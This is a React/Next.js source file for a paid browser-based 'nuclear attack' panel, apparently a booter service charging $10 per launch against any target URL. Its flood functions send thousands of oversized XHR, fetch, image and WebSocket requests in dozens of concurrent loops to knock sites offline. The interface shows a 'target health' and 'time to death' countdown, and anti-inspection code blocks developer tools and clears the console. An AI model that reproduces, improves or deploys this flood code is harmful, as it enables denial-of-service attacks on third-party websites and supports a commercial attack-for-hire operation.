"use client";

import React, { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { 
  User, Shield, Zap, Skull, Bomb, Radio, 
  Activity, Cpu, Terminal, AlertTriangle,
  LogOut, DollarSign, UserCog,
  Moon, Sun, Menu, X, Home, Settings,
  BarChart, Globe, Target, ChevronRight,
  CreditCard, History, Bell, Shield as ShieldIcon,
  Wifi, Power, Clock, Radar
} from 'lucide-react';

// Define type for menu item colors
type MenuItemColor = 'blue' | 'purple' | 'green' | 'red' | 'yellow' | 'cyan';

// Define interface for menu items
interface MenuItem {
  icon: React.ElementType;
  label: string;
  value: string | number;
  color: MenuItemColor;
}

const NuclearAttackCommand = () => {
  const [isAttacking, setIsAttacking] = useState(false);
  const [strikeCount, setStrikeCount] = useState(0);
  const [attackPower, setAttackPower] = useState(100);
  const [targetUrl, setTargetUrl] = useState('');
  const [health, setHealth] = useState(100);
  const [ttd, setTtd] = useState(0);
  const [radiation, setRadiation] = useState("0MB");
  const [warningText, setWarningText] = useState('⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️');
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [isSideMenuOpen, setIsSideMenuOpen] = useState(false);

  // --- UPGRADE: Balance & User States ---
  const [balance, setBalance] = useState(0);
  const [userEmail, setUserEmail] = useState('');
  const [userId, setUserId] = useState('');
  const [userRole, setUserRole] = useState('user');
  const [userStatus, setUserStatus] = useState('active');
  const router = useRouter();

  const attackIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const statsIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // --- UPGRADE: Fetch User Data & Auto-Ban Check ---
  const fetchStatus = async () => {
    try {
      const res = await fetch('/api/users');
      const data = await res.json();
      if (data && data.length > 0) {
        // এখানে তোর লগইন করা ইউজারকে খুঁজে নেওয়া হচ্ছে
        const user = data[0]; 
        setBalance(user.balance || 0);
        setUserEmail(user.email || 'AGENT');
        setUserId(user._id);
        setUserRole(user.role || 'user');
        setUserStatus(user.isBanned ? 'banned' : 'active');

        if (user.isBanned) {
          await fetch('/api/logout');
          alert("💀 SESSION TERMINATED: YOU ARE BANNED!");
          router.replace('/');
        }
      }
    } catch (e) { console.error("Sync Error"); }
  };

  useEffect(() => {
    fetchStatus();
    const interval = setInterval(fetchStatus, 10000); // ১০ সেকেন্ড পর পর চেক
    return () => clearInterval(interval);
  }, []);

  const handleLogout = async () => {
    await fetch('/api/logout');
    router.replace('/');
  };

  const toggleTheme = () => {
    setIsDarkMode(!isDarkMode);
  };

  const toggleSideMenu = () => {
    setIsSideMenuOpen(!isSideMenuOpen);
  };

  // Security Protocols (Right click & Keyboard shortcuts) - NO CHANGE
  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.keyCode === 83)
      ) {
        e.preventDefault();
      }
      if (e.key === 'Escape' && isAttacking) {
        emergencyStop();
      }
      if (e.key === 'm' || e.key === 'M') {
        toggleSideMenu();
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);
    const consoleClear = setInterval(() => console.clear(), 100);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
      clearInterval(consoleClear);
    };
  }, [isAttacking]);

  // Attack Functions - NO CHANGE
  const nuclearHttpFlood = async (url: string) => {
    for (let i = 0; i < 150; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?nuclear=' + Math.random() + '&' + 'X'.repeat(7500), true);
        xhr.timeout = 1;
        xhr.send();
        fetch(url + '?atomic=' + Math.random(), { mode: 'no-cors', cache: 'no-store', headers: { 'X-Nuclear': 'X'.repeat(15000) } }).catch(() => {});
        let img = new Image();
        img.src = url + '/bomb_' + Math.random() + '?' + 'X'.repeat(3000);
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 150);
  };

  const atomTcpFlood = async (url: string) => {
    for (let i = 0; i < 300; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?syn=' + Math.random(), true);
        xhr.timeout = 1;
        xhr.send();
        let ws = new WebSocket(url.replace('http', 'ws'));
        setTimeout(() => ws.close(), 1);
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 300);
  };

  const hydrogenUdpFlood = async (url: string) => {
    for (let i = 0; i < 750; i++) {
      try {
        fetch(url + '?udp=' + Math.random(), { mode: 'no-cors', body: 'X'.repeat(15000) }).catch(() => {});
        let xhr = new XMLHttpRequest();
        xhr.open('POST', url + '?udp=' + Math.random(), true);
        xhr.send('X'.repeat(15000));
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 750);
  };

  const superNovaAttack = async (url: string) => {
    for (let i = 0; i < 1500; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?nova=' + Math.random() + '&' + 'X'.repeat(15000), true);
        xhr.timeout = 1;
        xhr.send();
        fetch(url + '?super=' + Math.random(), { mode: 'no-cors', body: 'X'.repeat(75000) }).catch(() => {});
        let img = new Image();
        img.src = url + '/nova_' + Math.random() + '?' + 'X'.repeat(15000);
        let ws = new WebSocket(url.replace('http', 'ws'));
        ws.send('X'.repeat(15000));
        setTimeout(() => ws.close(), 1);
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 1500);
  };

  const launchNuclearStrike = (url: string) => {
    for (let i = 0; i < 75; i++) {
      (async () => {
        while (isAttacking) {
          try {
            if (attackPower === 100) await nuclearHttpFlood(url);
            else if (attackPower === 200) await atomTcpFlood(url);
            else if (attackPower === 300) await hydrogenUdpFlood(url);
            else await superNovaAttack(url);
            await new Promise(r => setTimeout(r, 0));
          } catch (e) {
            setStrikeCount(prev => prev + 2);
          }
        }
      })();
    }
  };

  useEffect(() => {
    if (isAttacking) {
      launchNuclearStrike(targetUrl);
      let warningCount = 0;
      const warningInterval = setInterval(() => {
        warningCount++;
        setWarningText(`⚠️ NUCLEAR RADIATION: ${warningCount * 15}% ⚠️`);
        if (strikeCount > 150000) {
          setWarningText('💀 TARGET DESTROYED - MISSION COMPLETE 💀');
        }
      }, 500);

      const statsInterval = setInterval(() => {
        const rad = (strikeCount * 0.75).toFixed(0);
        setRadiation(Number(rad) > 999 ? (Number(rad) / 1000).toFixed(1) + 'GB' : rad + 'MB');
        const currentHealth = Math.max(0, 100 - Math.floor(strikeCount / 667));
        setHealth(currentHealth);
        setTtd(Math.max(0, Math.floor(currentHealth / 15)));
      }, 100);

      return () => {
        clearInterval(warningInterval);
        clearInterval(statsInterval);
      };
    }
  }, [isAttacking]);

  // --- UPGRADE: Balance Deduction on Launch ---
  const handleFire = async () => {
    if (isAttacking) {
      emergencyStop();
      return;
    }
    if (!targetUrl.startsWith('http')) {
      alert('ERROR: http:// বা https:// দাও!');
      return;
    }
    if (balance < 10) {
      alert('⚠️ INSUFFICIENT BALANCE ($10 REQUIRED)');
      return;
    }

    try {
      const newBalance = balance - 10;
      const res = await fetch('/api/users', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: userId, balance: newBalance }),
      });

      if (res.ok) {
        setBalance(newBalance);
        setIsAttacking(true);
        setStrikeCount(0);
      }
    } catch (e) { alert("Attack Failed!"); }
  };

  const emergencyStop = () => {
    setIsAttacking(false);
    window.stop();
  };

  // Side menu items with proper typing
  const menuItems: MenuItem[] = [
    { icon: User, label: 'Profile', value: userEmail, color: 'blue' },
    { icon: CreditCard, label: 'Balance', value: `$${balance.toLocaleString()}`, color: 'yellow' },
    { icon: Shield, label: 'Role', value: userRole?.toUpperCase(), color: 'purple' },
    { icon: Activity, label: 'Status', value: userStatus?.toUpperCase(), color: userStatus === 'active' ? 'green' : 'red' },
 
  ];

  // Color classes with proper typing
  const colorClasses: Record<MenuItemColor, string> = {
    blue: isDarkMode ? 'text-blue-400' : 'text-blue-600',
    purple: isDarkMode ? 'text-purple-400' : 'text-purple-600',
    green: isDarkMode ? 'text-green-400' : 'text-green-600',
    red: isDarkMode ? 'text-red-400' : 'text-red-600',
    yellow: isDarkMode ? 'text-yellow-400' : 'text-yellow-600',
    cyan: isDarkMode ? 'text-cyan-400' : 'text-cyan-600',
  };

  return (
    <div className={`flex h-screen overflow-hidden font-mono select-none relative ${
      isDarkMode ? 'bg-black text-white' : 'bg-gray-100 text-gray-900'
    }`}>
      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes nuclearPulse {
          0% { border-color: #3700ff; box-shadow: 0 0 100px rgba(76, 0, 255, 0.7); }
          50% { border-color: #48ff00; box-shadow: 0 0 150px rgba(43, 255, 0, 0.9); }
          100% { border-color: #ff0000; box-shadow: 0 0 100px rgba(255,0,0,0.7); }
          70% { border-color: #00ffdd; box-shadow: 0 0 200px rgb(0, 225, 255); }
          90% { border-color: #ffd900; box-shadow: 0 0 120px rgb(255, 208, 0); }
          80% { border-color: #ff006a; box-shadow: 0 0 180px rgb(255, 0, 149); }
        }
        @keyframes nuclearText {
          0% { opacity: 1; text-shadow: 0 0 30px red; }
          50% { opacity: 0.9; text-shadow: 0 0 50px #3cff00; }
          100% { opacity: 1; text-shadow: 0 0 30px red; }
        }
        @keyframes warningBlink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        @keyframes nuclearButton { 0% { transform: scale(1); } 50% { transform: scale(1.05); box-shadow: 0 0 100px red; } 100% { transform: scale(1); } }
        @keyframes scanline {
          0% { transform: translateY(-100%); }
          100% { transform: translateY(100%); }
        }
        .scanline {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 10px;
          background: linear-gradient(to bottom, transparent, rgba(0, 255, 0, 0.1), transparent);
          animation: scanline 6s linear infinite;
          pointer-events: none;
          z-index: 10;
        }
        @media (max-width: 768px) {
          .control-panel {
            width: 95% !important;
            padding: 12px !important;
          }
          .text-\\[48px\\] {
            font-size: 20px !important;
          }
          .stats-grid {
            grid-template-columns: repeat(2, 1fr) !important;
            gap: 8px !important;
          }
          .attack-options {
            grid-template-columns: repeat(2, 1fr) !important;
            gap: 8px !important;
          }
        }
      `}} />
      
      {/* Scanline Effect */}
      <div className="scanline"></div>

      {/* Menu Toggle Button */}
      <button
        onClick={toggleSideMenu}
        className={`fixed top-4 left-4 z-50 p-3 rounded-xl transition-all duration-300 ${
          isDarkMode 
            ? 'bg-gray-900 border border-cyan-500/30 hover:border-cyan-400' 
            : 'bg-white border border-gray-300 hover:border-blue-400 shadow-lg'
        } ${isSideMenuOpen ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}
      >
        <Menu className={`w-5 h-5 ${isDarkMode ? 'text-cyan-400' : 'text-gray-700'}`} />
      </button>

      {/* Side Menu */}
      <div
        className={`fixed top-0 left-0 h-full w-[280px] md:w-[320px] z-50 transition-transform duration-300 ease-out ${
          isSideMenuOpen ? 'translate-x-0' : '-translate-x-full'
        } ${isDarkMode ? 'bg-gray-950 border-r border-cyan-500/30' : 'bg-white border-r border-gray-200 shadow-2xl'}`}
      >
        {/* Menu Header */}
        <div className={`p-5 border-b ${isDarkMode ? 'border-cyan-500/30' : 'border-gray-200'}`}>
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <div className={`w-10 h-10 rounded-xl bg-gradient-to-br from-red-600 to-blue-600 flex items-center justify-center`}>
                <Skull className="w-5 h-5 text-white" />
              </div>
              <div>
                <h2 className={`font-black text-sm ${isDarkMode ? 'text-cyan-400' : 'text-blue-600'}`}>NUCLEAR CMD</h2>
                <p className={`text-[10px] ${isDarkMode ? 'text-gray-500' : 'text-gray-400'}`}>v2.0.1 • ACTIVE</p>
              </div>
            </div>
            <button
              onClick={toggleSideMenu}
              className={`p-2 rounded-lg transition-all ${
                isDarkMode 
                  ? 'hover:bg-gray-800 text-gray-400 hover:text-white' 
                  : 'hover:bg-gray-100 text-gray-600'
              }`}
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {/* Quick Actions */}
          <div className="flex gap-2 mt-2">
            <button
              onClick={toggleTheme}
              className={`flex-1 py-2 px-3 rounded-lg text-xs font-black flex items-center justify-center gap-2 transition-all ${
                isDarkMode
                  ? 'bg-gray-800 text-yellow-400 hover:bg-gray-700'
                  : 'bg-gray-100 text-indigo-600 hover:bg-gray-200'
              }`}
            >
              {isDarkMode ? <Sun className="w-3 h-3" /> : <Moon className="w-3 h-3" />}
              {isDarkMode ? 'LIGHT' : 'DARK'}
            </button>
            <button
              onClick={handleLogout}
              className={`flex-1 py-2 px-3 rounded-lg text-xs font-black flex items-center justify-center gap-2 transition-all ${
                isDarkMode
                  ? 'bg-red-950/30 text-red-400 hover:bg-red-900/50 border border-red-800'
                  : 'bg-red-50 text-red-600 hover:bg-red-100 border border-red-200'
              }`}
            >
              <LogOut className="w-3 h-3" />
              EXIT
            </button>
          </div>
        </div>

        {/* Menu Items */}
        <div className="p-4 overflow-y-auto h-[calc(100%-140px)]">
          <div className="space-y-2">
            {menuItems.map((item, index) => {
              const Icon = item.icon;
              return (
                <div
                  key={index}
                  className={`p-3 rounded-xl transition-all ${
                    isDarkMode 
                      ? 'bg-gray-900/50 hover:bg-gray-800 border border-gray-800' 
                      : 'bg-gray-50 hover:bg-gray-100 border border-gray-200'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className={`p-2 rounded-lg ${isDarkMode ? 'bg-gray-800' : 'bg-white'}`}>
                      <Icon className={`w-4 h-4 ${colorClasses[item.color]}`} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className={`text-[10px] ${isDarkMode ? 'text-gray-500' : 'text-gray-400'}`}>{item.label}</p>
                      <p className={`text-sm font-black truncate ${colorClasses[item.color]}`}>{item.value}</p>
                    </div>
                    <ChevronRight className={`w-3 h-3 ${isDarkMode ? 'text-gray-600' : 'text-gray-400'}`} />
                  </div>
                </div>
              );
            })}
          </div>

          {/* System Info */}
          <div className={`mt-6 p-4 rounded-xl ${isDarkMode ? 'bg-gray-900/50' : 'bg-gray-50'} border ${isDarkMode ? 'border-gray-800' : 'border-gray-200'}`}>
            <div className="flex items-center gap-2 mb-3">
              <Cpu className={`w-3 h-3 ${isDarkMode ? 'text-cyan-400' : 'text-blue-600'}`} />
              <span className={`text-[10px] font-black ${isDarkMode ? 'text-gray-400' : 'text-gray-500'}`}>SYSTEM STATUS</span>
            </div>
            <div className="space-y-2 text-[10px]">
              <div className="flex justify-between">
                <span className={isDarkMode ? 'text-gray-500' : 'text-gray-400'}>CONNECTION</span>
                <span className="text-green-500 font-black">SECURE</span>
              </div>
              <div className="flex justify-between">
                <span className={isDarkMode ? 'text-gray-500' : 'text-gray-400'}>ENCRYPTION</span>
                <span className="text-yellow-500 font-black">AES-256</span>
              </div>
              <div className="flex justify-between">
                <span className={isDarkMode ? 'text-gray-500' : 'text-gray-400'}>FIREWALL</span>
                <span className="text-blue-500 font-black">ACTIVE</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Overlay */}
      {isSideMenuOpen && (
        <div
          onClick={toggleSideMenu}
          className="fixed inset-0 bg-black/50 z-40 md:hidden"
        ></div>
      )}

      {/* Main Content */}
      <div className="flex-1 overflow-auto">
        <div className="flex items-center justify-center min-h-screen p-3 md:p-6">
          <div className={`control-panel w-[1100px] p-3 md:p-[30px] rounded-[20px] relative border-4 ${
            isDarkMode ? 'bg-[#0f0000]' : 'bg-white'
          }`} 
               style={{ animation: 'nuclearPulse 0.5s infinite', borderColor: '#00f7ff' }}>
            
            {/* Header */}
            <div className="header text-center mb-4 md:mb-5">
              <h1 className="text-[20px] md:text-[48px] m-0 flex items-center justify-center gap-1 md:gap-3 flex-wrap" style={{ color: '#00f7ff', animation: 'nuclearText 0.3s infinite' }}>
                <Skull className="w-5 h-5 md:w-12 md:h-12" />
                <span>💀 ADIAT NUCLEAR ATTACK MODE 💀</span>
                <Bomb className="w-5 h-5 md:w-12 md:h-12" />
              </h1>
              <div className="warning text-[#00ffd5] text-[12px] md:text-[20px] font-bold" style={{ animation: 'warningBlink 0.1s infinite' }}>
                {warningText}
              </div>
            </div>

            {/* Terminal Status Bar */}
            <div className={`flex items-center gap-2 md:gap-3 mb-4 px-3 md:px-4 py-2 border rounded-lg ${
              isDarkMode ? 'bg-gray-900/50 border-cyan-900' : 'bg-gray-200 border-cyan-300'
            }`}>
              <Terminal className="w-3 h-3 md:w-4 md:h-4 text-cyan-500 flex-shrink-0" />
              <div className="flex flex-wrap gap-2 md:gap-4 text-[8px] md:text-[10px] font-mono">
                <span className="text-cyan-400">CONNECTION: <span className="text-green-400">SECURE</span></span>
                <span className="text-cyan-400">ENCRYPTION: <span className="text-yellow-400">AES-256</span></span>
                <span className="text-cyan-400">STATUS: <span className="text-purple-400">ARMED</span></span>
              </div>
              <Cpu className="w-3 h-3 md:w-4 md:h-4 text-cyan-500 ml-auto flex-shrink-0" />
            </div>

            <div className="input-group mb-4 md:mb-5">
              <label className="block mb-1 font-black flex items-center gap-2 text-xs md:text-base">
                <Radio className="w-3 h-3 md:w-4 md:h-4 text-red-500" />
                🎯 TARGET URL ($10 PER LAUNCH)
              </label>
              <input 
                type="text" 
                value={targetUrl} 
                onChange={(e) => setTargetUrl(e.target.value)}
                className={`w-full p-2 md:p-[15px] border-2 text-[12px] md:text-[16px] font-bold outline-none ${
                  isDarkMode ? 'bg-[#1a0000] border-[#660000]' : 'bg-white border-gray-300'
                }`}
                style={{ color: '#ffffff' }}
                placeholder="https://example.com"
              />
            </div>

            <div className="attack-options grid grid-cols-2 md:grid-cols-4 gap-2 md:gap-[15px] my-3 md:my-[25px]">
              {[
                { id: 100, title: '🔥 NUCLEAR HTTP', desc: '150K req/sec' },
                { id: 200, title: '⚡ ATOM TCP', desc: '300K connections' },
                { id: 300, title: '💧 HYDROGEN UDP', desc: '750K packets' },
                { id: 400, title: '✨ SUPERNOVA', desc: '1.5M combined' }
              ].map((option) => (
                <div 
                  key={option.id}
                  onClick={() => setAttackPower(option.id)}
                  className={`attack-card p-2 md:p-[20px] text-center cursor-pointer border-2 transition-all ${
                    attackPower === option.id 
                      ? 'selected border-[#ff0000] bg-[#330000]' 
                      : isDarkMode ? 'bg-[#1a0000] border-[#00e1ff]' : 'bg-gray-200 border-blue-400'
                  }`}
                  style={attackPower === option.id ? { boxShadow: '0 0 50px red', border: '4px solid #ff0000' } : {}}
                >
                  <h3 className="m-0 text-[12px] md:text-[18px] font-black">{option.title}</h3>
                  <p className="m-0 mt-1 text-[8px] md:text-[14px]">{option.desc}</p>
                </div>
              ))}
            </div>

            <div className="stats-grid grid grid-cols-2 md:grid-cols-4 gap-2 md:gap-[15px] my-3 md:my-[25px]">
              {[
                { label: 'NUCLEAR STRIKES', value: strikeCount.toLocaleString(), icon: Bomb },
                { label: 'RADIATION', value: radiation, icon: Radio },
                { label: 'TARGET HEALTH', value: health <= 0 ? '0% 💀' : `${health}%`, icon: Activity },
                { label: 'TIME TO DEATH', value: health <= 0 ? 'DEAD' : `${ttd}s`, icon: Skull }
              ].map((stat, i) => {
                const Icon = stat.icon;
                return (
                  <div key={i} className={`stat-box border-2 p-2 md:p-[20px] text-center relative group ${
                    isDarkMode ? 'bg-black border-[#660000]' : 'bg-white border-gray-300'
                  }`}>
                    <div className="absolute inset-0 bg-gradient-to-t from-red-500/0 group-hover:from-red-500/5 transition-all"></div>
                    <Icon className="w-3 h-3 md:w-5 md:h-5 text-red-500 mx-auto mb-1 md:mb-2" />
                    <div className="text-[8px] md:text-[10px] text-gray-400 mb-1 font-black">{stat.label}</div>
                    <div className="stat-value text-[#ff0000] text-[14px] md:text-[30px] font-bold" style={{ textShadow: '0 0 20px red' }}>
                      {stat.value}
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Attack Cost Indicator */}
            <div className="flex items-center justify-center gap-2 mb-2">
              <Zap className="w-3 h-3 md:w-4 md:h-4 text-yellow-500" />
              <span className={`text-[8px] md:text-xs font-mono ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                ATTACK COST: <span className="text-yellow-500 font-black">$10</span> PER LAUNCH
              </span>
              <Zap className="w-3 h-3 md:w-4 md:h-4 text-yellow-500" />
            </div>

            <button 
              onClick={handleFire}
              className="btn-nuclear w-full p-3 md:p-[30px] text-white text-[14px] md:text-[32px] font-black border-none cursor-pointer my-2 md:my-[20px] relative overflow-hidden group"
              style={{ 
                background: 'linear-gradient(45deg, #ff0000, #0004ff, #00ffdd, #00ff00)',
                animation: isAttacking ? 'none' : 'nuclearButton 0.2s infinite'
              }}
            >
              <div className="absolute inset-0 bg-white/0 group-hover:bg-white/10 transition-all"></div>
              {isAttacking ? (
                <span className="flex items-center justify-center gap-1 md:gap-3">
                  <Skull className="w-4 h-4 md:w-8 md:h-8 animate-pulse" />
                  <span className="text-[12px] md:text-[32px]">💥 NUCLEAR STRIKE IN PROGRESS 💥</span>
                  <Skull className="w-4 h-4 md:w-8 md:h-8 animate-pulse" />
                </span>
              ) : (
                <span className="flex items-center justify-center gap-1 md:gap-3">
                  <Bomb className="w-4 h-4 md:w-8 md:h-8" />
                  <span className="text-[12px] md:text-[32px]">💣 START NUCLEAR ATTACK ($10) 💣</span>
                  <Zap className="w-4 h-4 md:w-8 md:h-8" />
                </span>
              )}
            </button>

            <div 
              style={{ textAlign: 'center', color: '#00ff15', cursor: 'pointer' }} 
              onClick={emergencyStop}
              className="uppercase font-black hover:text-red-500 flex items-center justify-center gap-2 text-[10px] md:text-base"
            >
              <AlertTriangle className="w-3 h-3 md:w-4 md:h-4" />
              ⚠️ EMERGENCY STOP ⚠️
              <AlertTriangle className="w-3 h-3 md:w-4 md:h-4" />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default NuclearAttackCommand;